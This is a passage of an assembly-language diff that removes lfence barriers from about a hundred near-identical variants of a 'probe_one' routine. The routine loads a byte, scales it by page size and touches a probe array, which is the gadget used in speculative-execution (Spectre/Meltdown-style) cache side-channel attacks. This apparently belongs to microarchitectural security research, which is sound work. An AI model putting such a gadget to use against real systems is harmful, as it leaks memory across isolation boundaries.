 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 302
@@ -4435,10 +3833,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 303
@@ -4446,10 +3842,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 304
@@ -4457,10 +3851,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 305
@@ -4468,10 +3860,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 306
@@ -4479,10 +3869,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 307
@@ -4490,10 +3878,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 308
@@ -4501,10 +3887,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 309
@@ -4512,10 +3896,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 310
@@ -4523,10 +3905,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 311
@@ -4534,10 +3914,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 312
@@ -4545,10 +3923,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 313
@@ -4556,10 +3932,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 314
@@ -4567,10 +3941,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 315
@@ -4578,10 +3950,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 316
@@ -4589,10 +3959,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 317
@@ -4600,10 +3968,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 318
@@ -4611,10 +3977,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 319
@@ -4622,10 +3986,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 320
@@ -4633,10 +3995,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 321
@@ -4644,10 +4004,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 322
@@ -4655,10 +4013,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 323
@@ -4666,10 +4022,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 324
@@ -4677,10 +4031,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 325
@@ -4688,10 +4040,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 326
@@ -4699,10 +4049,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 327
@@ -4710,10 +4058,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 328
@@ -4721,10 +4067,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 329
@@ -4732,10 +4076,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 330
@@ -4743,10 +4085,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 331
@@ -4754,10 +4094,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 332
@@ -4765,10 +4103,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 333
@@ -4776,10 +4112,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 334
@@ -4787,10 +4121,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 335
@@ -4798,10 +4130,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 336
@@ -4809,10 +4139,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 337
@@ -4820,10 +4148,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 338
@@ -4831,10 +4157,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 339
@@ -4842,10 +4166,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 340
@@ -4853,10 +4175,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 341
@@ -4864,10 +4184,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 342
@@ -4875,10 +4193,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 343
@@ -4886,10 +4202,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 344
@@ -4897,10 +4211,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 345
@@ -4908,10 +4220,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 346
@@ -4919,10 +4229,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 347
@@ -4930,10 +4238,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 348
@@ -4941,10 +4247,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 349
@@ -4952,10 +4256,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 350
@@ -4963,10 +4265,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 351
@@ -4974,10 +4274,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 352
@@ -4985,10 +4283,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 353
@@ -4996,10 +4292,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 354
@@ -5007,10 +4301,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 355
@@ -5018,10 +4310,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 356
@@ -5029,10 +4319,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 357
@@ -5040,10 +4328,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 358
@@ -5051,10 +4337,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 359
@@ -5062,10 +4346,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 360
@@ -5073,10 +4355,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 361
@@ -5084,10 +4364,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 362
@@ -5095,10 +4373,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 363
@@ -5106,10 +4382,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 364
@@ -5117,10 +4391,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 365
@@ -5128,10 +4400,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 366
@@ -5139,10 +4409,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 367
@@ -5150,10 +4418,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 368
@@ -5161,10 +4427,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 369
@@ -5172,10 +4436,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 370
@@ -5183,10 +4445,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 371
@@ -5194,10 +4454,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 372
@@ -5205,10 +4463,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 373
@@ -5216,10 +4472,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 374
@@ -5227,10 +4481,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 375
@@ -5238,10 +4490,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 376
@@ -5249,10 +4499,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 377
@@ -5260,10 +4508,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 378
@@ -5271,10 +4517,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 379
@@ -5282,10 +4526,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 380
@@ -5293,10 +4535,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 381
@@ -5304,10 +4544,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 382
@@ -5315,10 +4553,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 383
@@ -5326,10 +4562,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 384
@@ -5337,10 +4571,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 385
@@ -5348,10 +4580,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 386
@@ -5359,10 +4589,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 387
@@ -5370,10 +4598,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 388
@@ -5381,10 +4607,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 389
@@ -5392,10 +4616,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 390
@@ -5403,10 +4625,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 391
@@ -5414,10 +4634,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 392
@@ -5425,10 +4643,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 393
@@ -5436,10 +4652,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 394
@@ -5447,10 +4661,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 395
@@ -5458,10 +4670,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 396
@@ -5469,10 +4679,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 397
@@ -5480,10 +4688,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 398
@@ -5491,10 +4697,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 399
@@ -5502,10 +4706,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 400
@@ -5513,10 +4715,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 401
@@ -5524,10 +4724,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 402
@@ -5535,10 +4733,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
